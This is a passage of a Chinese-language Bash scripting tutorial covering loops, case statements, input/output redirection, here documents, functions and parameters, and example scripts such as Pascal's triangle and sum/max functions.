<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#顺序输出当前列表中的数字</span></span><br><span class="line"><span class="keyword">for</span> loop <span class="keyword">in</span> 1 2 3 4 5</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;The value is: <span class="variable">$loop</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">The value is: 1</span><br><span class="line">The value is: 2</span><br><span class="line">The value is: 3</span><br><span class="line">The value is: 4</span><br><span class="line">The value is: 5</span><br><span class="line"></span><br><span class="line"><span class="comment">#顺序输出字符串中的字符：</span></span><br><span class="line"><span class="keyword">for</span> str <span class="keyword">in</span> <span class="string">&#x27;This is a string&#x27;</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$str</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">This is a string</span><br><span class="line"></span><br><span class="line"><span class="comment">#C语言方式</span></span><br><span class="line"><span class="keyword">for</span> ((i=<span class="number">1</span>;i&lt;=<span class="number">5</span>;i++))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> -e <span class="string">&quot;<span class="variable">$i</span> \c&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">1 2 3 4 5 </span><br></pre></td></tr></table></figure>
<h3 id="while循环">while循环</h3>
<p>while循环格式为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> condition</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">command</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>while循环可用于读取键盘信息。下面的例子中，输入信息被设置为变量FILM，按<code>Ctrl-D</code>结束循环。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;按下 &lt;CTRL-D&gt; 退出&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&#x27;输入你最喜欢的网站名: &#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> FILM</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;是的！<span class="variable">$FILM</span> 是一个好网站&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>运行脚本，输出类似下面：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">按下 <span class="tag">&lt;<span class="name">CTRL-D</span>&gt;</span> 退出</span><br><span class="line">输入你最喜欢的网站名:淘宝</span><br><span class="line">是的！淘宝 是一个好网站</span><br></pre></td></tr></table></figure>
<h3 id="无限循环">无限循环</h3>
<p>无限循环语法格式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> :           <span class="comment">#  三种方法均可</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>        <span class="comment">#  三种方法均可 </span></span><br><span class="line"><span class="keyword">for</span> (( ; ; ))     <span class="comment">#  三种方法均可</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">command</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<h3 id="until-循环">until 循环</h3>
<p>until 循环执行一系列命令直至条件为 true 时停止，与 while 循环在处理方式上刚好相反。</p>
<p>一般 while 循环优于 until 循环，但在某些时候——也只是极少数情况下，until 循环更加有用。</p>
<p>until 语法格式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">until</span> condition</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">command</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>condition 为条件表达式，如果返回值为 false，则继续执行循环体内的语句，否则跳出循环。</p>
<p>以下实例我们使用 until 命令来输出 0 ~ 9 的数字：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">a=0</span><br><span class="line"><span class="keyword">until</span> [ ! <span class="variable">$a</span> -lt 10 ]</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="variable">$a</span></span><br><span class="line">   a=`<span class="built_in">expr</span> <span class="variable">$a</span> + 1`</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<h3 id="循环控制语句"><strong>循环控制语句</strong></h3>
<p>在循环过程中，有时候需要在未达到循环结束条件时强制跳出循环，Shell使用两个命令来实现该功能：break和continue。</p>
<p>break命令允许跳出所有循环（终止执行后面的所有循环）。</p>
<p>下面的例子中，脚本进入死循环直至用户输入数字大于5。要跳出这个循环，返回到shell提示符下，需要使用break命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">while</span> :</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> -n <span class="string">&quot;输入 1 到 5 之间的数字:&quot;</span></span><br><span class="line">    <span class="built_in">read</span> aNum</span><br><span class="line">    <span class="keyword">case</span> <span class="variable">$aNum</span> <span class="keyword">in</span></span><br><span class="line">        1|2|3|4|5) <span class="built_in">echo</span> <span class="string">&quot;你输入的数字为 <span class="variable">$aNum</span>!&quot;</span></span><br><span class="line">        ;;</span><br><span class="line">        *) <span class="built_in">echo</span> <span class="string">&quot;你输入的数字不是 1 到 5 之间的! 游戏结束&quot;</span></span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">        ;;</span><br><span class="line">    <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>执行以上代码，输出结果为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">输入 1 到 5 之间的数字:3</span><br><span class="line">你输入的数字为 3!</span><br><span class="line">输入 1 到 5 之间的数字:7</span><br><span class="line">你输入的数字不是 1 到 5 之间的! 游戏结束</span><br></pre></td></tr></table></figure>
<p>continue命令与break命令类似，只有一点差别，它不会跳出所有循环，仅仅跳出当前循环。</p>
<h3 id="case">case</h3>
<p>Shell case语句为多选择语句。可以用case语句匹配一个值与一个模式，如果匹配成功，执行相匹配的命令。case语句格式如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> 值 <span class="keyword">in</span></span><br><span class="line">模式1)</span><br><span class="line">    command1</span><br><span class="line">    ...</span><br><span class="line">    commandN</span><br><span class="line">    ;;</span><br><span class="line">模式2）</span><br><span class="line">    command1</span><br><span class="line">    ...</span><br><span class="line">    commandN</span><br><span class="line">    ;;</span><br><span class="line">*)</span><br><span class="line">	command1</span><br><span class="line">	.....</span><br><span class="line">	commandn</span><br><span class="line">	;;</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure>
<p>下面的脚本提示输入1到4，与每一种模式进行匹配：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;输入 1 到 4 之间的数字:&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;你输入的数字为:&#x27;</span></span><br><span class="line"><span class="built_in">read</span> aNum</span><br><span class="line"><span class="keyword">case</span> <span class="variable">$aNum</span> <span class="keyword">in</span></span><br><span class="line">    1)  <span class="built_in">echo</span> <span class="string">&#x27;你选择了 1&#x27;</span></span><br><span class="line">    ;;</span><br><span class="line">    2)  <span class="built_in">echo</span> <span class="string">&#x27;你选择了 2&#x27;</span></span><br><span class="line">    ;;</span><br><span class="line">    3)  <span class="built_in">echo</span> <span class="string">&#x27;你选择了 3&#x27;</span></span><br><span class="line">    ;;</span><br><span class="line">    4)  <span class="built_in">echo</span> <span class="string">&#x27;你选择了 4&#x27;</span></span><br><span class="line">    ;;</span><br><span class="line">    *)  <span class="built_in">echo</span> <span class="string">&#x27;你没有输入 1 到 4 之间的数字&#x27;</span></span><br><span class="line">    ;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"><span class="comment">#输入不同的内容，会有不同的结果，例如：</span></span><br><span class="line">输入 1 到 4 之间的数字:</span><br><span class="line">你输入的数字为:</span><br><span class="line">3</span><br><span class="line">你选择了 3</span><br></pre></td></tr></table></figure>
<h2 id="Shell输入-输出重定向">Shell输入/输出重定向</h2>
<p>重定向命令列表如下：</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>command &gt; file</td>
<td>将输出重定向到 file。</td>
</tr>
<tr>
<td>command &lt; file</td>
<td>将输入重定向到 file。</td>
</tr>
<tr>
<td>command &gt;&gt; file</td>
<td>将输出以追加的方式重定向到 file。</td>
</tr>
<tr>
<td>n &gt; file</td>
<td>将文件描述符为 n 的文件重定向到 file。</td>
</tr>
<tr>
<td>n &gt;&gt; file</td>
<td>将文件描述符为 n 的文件以追加的方式重定向到 file。</td>
</tr>
<tr>
<td>n &gt;&amp; m</td>
<td>将输出文件 m 和 n 合并。</td>
</tr>
<tr>
<td>n &lt;&amp; m</td>
<td>将输入文件 m 和 n 合并。</td>
</tr>
<tr>
<td>&lt;&lt; tag</td>
<td>将开始标记 tag 和结束标记 tag 之间的内容作为输入。</td>
</tr>
</tbody>
</table>
<blockquote>
<p>需要注意的是文件描述符 0 通常是标准输入（STDIN），1 是标准输出（STDOUT），2 是标准错误输出（STDERR）。</p>
</blockquote>
<hr>
<h3 id="输出重定向">输出重定向</h3>
<p>重定向一般通过在命令间插入特定的符号来实现。特别的，这些符号的语法如下所示:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">command1 &gt; file1</span><br></pre></td></tr></table></figure>
<p>上面这个命令执行command1然后将输出的内容存入file1。</p>
<p>注意任何file1内的已经存在的内容将被新内容替代。如果要将新内容添加在文件末尾，请使用&gt;&gt;操作符。</p>
<p>输出重定向会覆盖文件内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;www.baidu.com&quot;</span> &gt; <span class="built_in">users</span></span><br><span class="line">$ <span class="built_in">cat</span> <span class="built_in">users</span></span><br><span class="line">www.baidu.com</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<p>如果不希望文件内容被覆盖，可以使用 &gt;&gt; 追加到文件末尾，例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;www.baidu.com&quot;</span> &gt;&gt; <span class="built_in">users</span></span><br><span class="line">$ <span class="built_in">cat</span> <span class="built_in">users</span></span><br><span class="line">www.baidu.com</span><br><span class="line">www.baidu.com</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<h3 id="输入重定向">输入重定向</h3>
<p>和输出重定向一样，Unix 命令也可以从文件获取输入，语法为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">command1 &lt; file1</span><br></pre></td></tr></table></figure>
<p>这样，本来需要从键盘获取输入的命令会转移到文件读取内容。</p>
<p>注意：输出重定向是大于号(&gt;)，输入重定向是小于号(&lt;)。</p>
<p>统计 users 文件的行数,执行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python@ubuntu:~/test$ <span class="built_in">wc</span> -l <span class="built_in">test</span> </span><br><span class="line">4 <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<p>也可以将输入重定向到 users 文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python@ubuntu:~/test$ <span class="built_in">wc</span> -l &lt;<span class="built_in">test</span></span><br><span class="line">4</span><br></pre></td></tr></table></figure>
<p>注意：上面两个例子的结果不同：第一个例子，会输出文件名；第二个不会，因为它仅仅知道从标准输入读取内容。</p>
<p>同时替换输入和输出，执行command1，从文件infile读取内容，然后将输出写入到outfile中:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">command1 &lt; infile &gt; outfile</span><br></pre></td></tr></table></figure>
<h3 id="重定向深入讲解">重定向深入讲解</h3>
<p>一般情况下，每个 Unix/Linux 命令运行时都会打开三个文件：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>标准输入文件(stdin)：stdin的文件描述符为0，Unix程序默认从stdin读取数据。</p>
</li>
<li class="lvl-2">
<p>标准输出文件(stdout)：stdout 的文件描述符为1，Unix程序默认向stdout输出数据。</p>
</li>
<li class="lvl-2">
<p>标准错误文件(stderr)：stderr的文件描述符为2，Unix程序会向stderr流中写入错误信息。</p>
</li>
</ul>
<p>默认情况下，command &gt; file 将 stdout 重定向到 file，command &lt; file 将stdin 重定向到 file。</p>
<p>如果希望 stderr 重定向到 file，可以这样写：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">command</span> 2 &gt; file</span><br></pre></td></tr></table></figure>
<p>如果希望 stderr 追加到 file 文件末尾，可以这样写：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">command</span> 2 &gt;&gt; file</span><br></pre></td></tr></table></figure>
<p><strong>2</strong> 表示标准错误文件(stderr)。</p>
<p>如果希望将 stdout 和 stderr 合并后重定向到 file，可以这样写：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">command</span> &gt; file 2&gt;&amp;1</span><br><span class="line">或者</span><br><span class="line">$ <span class="built_in">command</span> &gt;&gt; file 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>如果希望对 stdin 和 stdout 都重定向，可以这样写：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">command</span> &lt; file1 &gt;file2</span><br></pre></td></tr></table></figure>
<p>command 命令将 stdin 重定向到 file1，将 stdout 重定向到 file2。</p>
<h3 id="Here-Document">Here Document</h3>
<p>Here Document 是 Shell 中的一种特殊的重定向方式，用来将输入重定向到一个交互式 Shell 脚本或程序。</p>
<p>它的基本的形式如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">command</span> &lt;&lt; <span class="string">delimiter</span></span><br><span class="line"><span class="string">    document</span></span><br><span class="line"><span class="string">delimiter</span></span><br></pre></td></tr></table></figure>
<p>它的作用是将两个 delimiter 之间的内容(document) 作为输入传递给 command。</p>
<p>注意：结尾的delimiter 一定要顶格写，前面不能有任何字符，后面也不能有任何字符，包括空格和 tab 缩进。</p>
<p>在命令行中通过 wc -l 命令计算 Here Document 的行数：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">wc</span> -l &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">    欢迎来到</span></span><br><span class="line"><span class="string">    菜鸟教程</span></span><br><span class="line"><span class="string">    www.runoob.com</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">3          <span class="comment"># 输出结果为 3 行</span></span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<h3 id="dev-null-文件">/dev/null 文件</h3>
<p>如果希望执行某个命令，但又不希望在屏幕上显示输出结果，那么可以将输出重定向到 /dev/null：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">command</span> &gt; /dev/null</span><br></pre></td></tr></table></figure>
<p>/dev/null 是一个特殊的文件，写入到它的内容都会被丢弃；如果尝试从该文件读取内容，那么什么也读不到。但是 /dev/null 文件非常有用，将命令的输出重定向到它，会起到&quot;禁止输出&quot;的效果。</p>
<p>如果希望屏蔽 stdout 和 stderr，可以这样写：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">command</span> &gt; /dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>0 是标准输入（STDIN），1 是标准输出（STDOUT），2 是标准错误输出（STDERR）。</p>
<h2 id="Shell-函数">Shell 函数</h2>
<p>与很多其他语言不同，所有函数在使用前必须定义。这意味着必须将函数放在脚本开始部分，直至shell解释器首次发现它时，才可以使用。调用函数仅使用其函数名即可。</p>
<p><strong>shell中函数的定义格式如下：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[ <span class="keyword">function</span> ] funname [()]</span><br><span class="line">&#123;</span><br><span class="line">    action;</span><br><span class="line">    [<span class="built_in">return</span> n;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>说明：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>1、可以带function fun() 定义，也可以直接fun() 定义（推荐），不带任何参数。</p>
</li>
<li class="lvl-2">
<p>2、参数返回，可以显示加：return 返回，如果不加，将以最后一条命令运行结果，作为返回值。 return后跟数值n(0-255)</p>
</li>
</ul>
<p>示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">funWithReturn</span></span>()&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;这个函数会对输入的两个数字进行相加运算...&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;输入第一个数字: &quot;</span></span><br><span class="line">    <span class="built_in">read</span> aNum</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;输入第二个数字: &quot;</span></span><br><span class="line">    <span class="built_in">read</span> anotherNum</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;两个数字分别为 <span class="variable">$aNum</span> 和 <span class="variable">$anotherNum</span> !&quot;</span></span><br><span class="line">    <span class="built_in">return</span> $((<span class="variable">$aNum</span>+<span class="variable">$anotherNum</span>))</span><br><span class="line">&#125;</span><br><span class="line">funWithReturn</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;输入的两个数字之和为 $? !&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行结果</span></span><br><span class="line">这个函数会对输入的两个数字进行相加运算...</span><br><span class="line">输入第一个数字: </span><br><span class="line">1</span><br><span class="line">输入第二个数字: </span><br><span class="line">2</span><br><span class="line">两个数字分别为 1 和 2 !</span><br><span class="line">输入的两个数字之和为 3 !</span><br></pre></td></tr></table></figure>
<p>函数返回值在调用该函数后可通过 $? 来获得。</p>
<p><strong>Shell函数脚本文件实现传参功能</strong></p>
<p><strong>传参方式一：</strong></p>
<p>在Shell中，调用函数时可以向其传递参数。在函数体内部，通过 <code>$n</code> 的形式来获取参数的值，当n&gt;=10时，需要使用<code>$&#123;n&#125;</code>来获取参数。</p>
<p>带参数的函数示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">funWithParam</span></span>()&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;第一个参数为 <span class="variable">$1</span> !&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;第二个参数为 <span class="variable">$2</span> !&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;第十个参数为 <span class="variable">$10</span> !&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;第十个参数为 <span class="variable">$&#123;10&#125;</span> !&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;第十一个参数为 <span class="variable">$&#123;11&#125;</span> !&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;参数总数有 <span class="variable">$#</span> 个!&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;作为一个字符串输出所有参数 $* !&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">funWithParam 1 2 3 4 5 6 7 8 9 34 73</span><br><span class="line"></span><br><span class="line"><span class="comment">#运行输出结果：</span></span><br><span class="line">第一个参数为 1 !</span><br><span class="line">第二个参数为 2 !</span><br><span class="line">第十个参数为 10 !</span><br><span class="line">第十个参数为 34 !</span><br><span class="line">第十一个参数为 73 !</span><br><span class="line">参数总数有 11 个!</span><br><span class="line">作为一个字符串输出所有参数 1 2 3 4 5 6 7 8 9 34 73 !</span><br></pre></td></tr></table></figure>
<p><strong>传参方式二：</strong></p>
<p>可以在调用时传参，但是脚本格式不能省略，用变量代替。如果是多个变量可以用<code>$*</code>代替</p>
<p>脚本执行效果演示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">funWithParam</span></span>()&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;第一个参数为 <span class="variable">$1</span> !&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;第二个参数为 <span class="variable">$2</span> !&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;第十个参数为 <span class="variable">$10</span> !&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;第十个参数为 <span class="variable">$&#123;10&#125;</span> !&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;第十一个参数为 <span class="variable">$&#123;11&#125;</span> !&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;参数总数有 <span class="variable">$#</span> 个!&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;作为一个字符串输出所有参数 $* !&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">funWithParam $*   <span class="comment"># 或者：funWithParam $1......$11</span></span><br><span class="line"></span><br><span class="line">[17:35:40 root@centon7 ~]# sh 1.sh 1 2 3 4 5 6 7 8 9 10 11</span><br><span class="line">第一个参数为 1 !</span><br><span class="line">第二个参数为 2 !</span><br><span class="line">第十个参数为 10 !</span><br><span class="line">第十个参数为 10 !</span><br><span class="line">第十一个参数为 11 !</span><br><span class="line">参数总数有 11 个!</span><br><span class="line">作为一个字符串输出所有参数 1 2 3 4 5 6 7 8 9 10 11 !</span><br></pre></td></tr></table></figure>
<br>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 主函数，第一个执行的函数  --主函数 先执行 调用其他函数</span></span><br><span class="line">main()&#123;</span><br><span class="line">  judge <span class="variable">$</span>*</span><br><span class="line">  <span class="built_in">compare</span> <span class="variable">$</span>*</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 调用主函数执行</span></span><br><span class="line">main <span class="variable">$</span>*</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>另外，还有几个特殊字符用来处理参数：</p>
<table>
<thead>
<tr>
<th>参数处理</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>$#</td>
<td>传递到脚本的参数个数</td>
</tr>
<tr>
<td>$*</td>
<td>以一个单字符串显示所有向脚本传递的参数</td>
</tr>
<tr>
<td>$$</td>
<td>脚本运行的当前进程ID号</td>
</tr>
<tr>
<td>$!</td>
<td>后台运行的最后一个进程的ID号</td>
</tr>
<tr>
<td>$@</td>
<td>与$*相同，但是使用时加引号，并在引号中返回每个参数。</td>
</tr>
<tr>
<td>$-</td>
<td>显示Shell使用的当前选项，与set命令功能相同。</td>
</tr>
<tr>
<td>$?</td>
<td>显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误。</td>
</tr>
</tbody>
</table>
<p>配置函数信息的文件：/etc/init.d/functions 。示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">.  /etc/init.d/functions</span><br><span class="line"></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;请输入一个数字：&quot;</span> num</span><br><span class="line"><span class="keyword">if</span>  [ <span class="variable">$num</span> -eq 10 ]</span><br><span class="line"> <span class="keyword">then</span></span><br><span class="line"> action <span class="string">&quot;输入信息正确&quot;</span> /bin/true</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"> action <span class="string">&quot;输入信息错误&quot;</span> /bin/false</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<p><img src="/posts/63063238//image-20250717172053299.png" alt="image-20250717172053299"></p>
<h3 id="实例">实例</h3>
<h3 id="杨辉三角：">杨辉三角：</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">test</span> -z <span class="variable">$1</span>) ;<span class="keyword">then</span> </span><br><span class="line"> <span class="built_in">read</span> -p <span class="string">&quot;Input high Int Lines:&quot;</span> high </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line"> high=<span class="variable">$1</span> </span><br><span class="line"><span class="keyword">fi</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">test</span> -z <span class="variable">$2</span>) ;<span class="keyword">then</span> </span><br><span class="line"> space=4</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line"> space=<span class="variable">$2</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">printspace</span></span>()&#123;</span><br><span class="line">  <span class="comment">#空位填充</span></span><br><span class="line">  <span class="keyword">for</span>((z=<span class="number">1</span>;z&lt;=<span class="variable">$1</span>;z++));<span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> -n <span class="string">&quot; &quot;</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a[0]=1     </span><br><span class="line"><span class="keyword">for</span>((i=<span class="number">0</span>;i&lt;=high;i++));<span class="keyword">do</span></span><br><span class="line">  <span class="comment">#产生当前列数据数组</span></span><br><span class="line">  <span class="keyword">for</span> ((j=<span class="variable">$i</span>;j&gt;<span class="number">0</span>;j--));<span class="keyword">do</span> </span><br><span class="line">    ((a[<span class="variable">$j</span>]+=a[<span class="variable">$j</span>-<span class="number">1</span>])) </span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line">  printspace $(((<span class="variable">$high</span>-<span class="variable">$i</span>)*<span class="variable">$space</span>/<span class="number">2</span>))</span><br><span class="line">  <span class="keyword">for</span> ((j=<span class="number">0</span>;j&lt;=<span class="variable">$i</span>;j++));<span class="keyword">do</span></span><br><span class="line">    num=$((<span class="variable">$space</span>-<span class="variable">$&#123;#a[$j]&#125;</span>))</span><br><span class="line">    printspace $((<span class="variable">$num</span>/<span class="number">2</span>))</span><br><span class="line">    <span class="built_in">echo</span> -n <span class="variable">$&#123;a[$j]&#125;</span></span><br><span class="line">    printspace $((<span class="variable">$num</span>-<span class="variable">$num</span>/<span class="number">2</span>))</span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<h3 id="sum-max">sum()&amp;max():</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;shell的函数返回值只能为0~255的整数，高位自动丢弃&quot;</span></span><br><span class="line"><span class="function"><span class="title">sum</span></span>()&#123;</span><br><span class="line"> <span class="built_in">sum</span>=0</span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable">$@</span></span><br><span class="line"> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">test</span> <span class="variable">$i</span> -ne <span class="variable">$1</span>;<span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> -n <span class="string">&quot;+&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  <span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$i</span>&quot;</span></span><br><span class="line">  <span class="built_in">sum</span>=$((<span class="variable">$sum</span>+<span class="variable">$i</span>))</span><br><span class="line"> <span class="keyword">done</span></span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&quot;=<span class="variable">$sum</span>&quot;</span></span><br><span class="line"> <span class="built_in">return</span> $((<span class="variable">$sum</span>))</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">sum</span> <span class="variable">$@</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;‘sum()’函数返回值：&quot;</span>$?</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">max</span></span>()&#123;</span><br><span class="line"> max=0</span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable">$@</span>;<span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">test</span> <span class="variable">$i</span> -ge <span class="variable">$max</span>;<span class="keyword">then</span></span><br><span class="line">    max=<span class="variable">$i</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"> <span class="keyword">done</span></span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&quot;参数最大值：<span class="variable">$max</span>&quot;</span></span><br><span class="line"> <span class="built_in">return</span> $((<span class="variable">$max</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">max <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;‘max()’函数返回值：&quot;</span>$?</span><br></pre></td></tr></table></figure>
<h3 id="99乘法表：">99乘法表：</h3>
